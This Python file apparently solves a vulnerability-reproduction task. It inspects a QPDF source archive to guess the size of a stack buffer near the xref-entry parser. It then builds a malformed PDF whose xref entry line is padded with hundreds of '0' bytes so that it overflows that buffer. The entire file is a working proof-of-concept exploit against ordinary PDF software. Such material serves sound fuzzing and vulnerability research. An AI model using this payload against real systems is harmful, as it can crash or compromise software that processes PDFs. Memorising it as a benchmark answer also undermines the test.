import io
import os
import re
import tarfile
from typing import Optional


class Solution:
    def _infer_stack_buf_size(self, src_path: str) -> int:
        default_size = 32
        if not src_path or not os.path.exists(src_path):
            return default_size

        try:
            with tarfile.open(src_path, "r:*") as tf:
                needle = b"read_xrefEntry"
                candidates = []
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith((".cc", ".cpp", ".cxx", ".h", ".hpp"))):
                        continue
                    if "qpdf" not in name and "libqpdf" not in name:
                        continue
                    if m.size <= 0 or m.size > 5_000_000:
                        continue
                    candidates.append(m)

                # Fall back to scanning all source-ish files if none filtered
                if not candidates:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name.lower()
                        if not (name.endswith((".cc", ".cpp", ".cxx", ".h", ".hpp"))):
                            continue
                        if m.size <= 0 or m.size > 5_000_000:
                            continue
                        candidates.append(m)

                for m in candidates:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    if needle not in data:
                        continue

                    text = data.decode("latin-1", "ignore")
                    idx = text.find("read_xrefEntry")
                    if idx < 0:
                        continue
                    lo = max(0, idx - 6000)
                    hi = min(len(text), idx + 6000)
                    snippet = text[lo:hi]

                    sizes = []

                    for mm in re.finditer(r'\bchar\s+\w+\s*\[\s*(\d+)\s*\]', snippet):
                        try:
                            sizes.append(int(mm.group(1)))
                        except Exception:
                            pass
                    for mm in re.finditer(r'std::array\s*<\s*char\s*,\s*(\d+)\s*>', snippet):
                        try:
                            sizes.append(int(mm.group(1)))
                        except Exception:
                            pass
                    for mm in re.finditer(r'\bstd::vector\s*<\s*char\s*>\s+(\w+)\s*\(\s*(\d+)\s*\)', snippet):
                        try:
                            sizes.append(int(mm.group(2)))
                        except Exception:
                            pass

                    sizes = [s for s in sizes if 8 <= s <= 4096]
                    if sizes:
                        # Prefer a plausible small stack buffer near xref parsing (often around 20-128)
                        sizes.sort()
                        for s in sizes:
                            if s >= 20:
                                return s
                        return sizes[0]

                    return default_size
        except Exception:
            return default_size

        return default_size

    def solve(self, src_path: str) -> bytes:
        buf_size = self._infer_stack_buf_size(src_path)
        extra_zeros = max(64, min(2048, buf_size * 8))

        header = b"%PDF-1.1\n"
        obj1 = b"1 0 obj\n<< /Type /Catalog >>\nendobj\n"
        xref_offset = len(header) + len(obj1)

        entry0 = b"0000000000 65535 f \n"
        # Intentionally overlong xref entry line: expected EOL replaced with many '0' bytes
        entry1 = b"0000000000 00000 n " + (b"0" * extra_zeros) + b"\n"

        xref = b"xref\n0 2\n" + entry0 + entry1
        trailer = b"trailer\n<< /Size 2 /Root 1 0 R >>\n"
        startxref = b"startxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"

        return header + obj1 + xref + trailer + startxref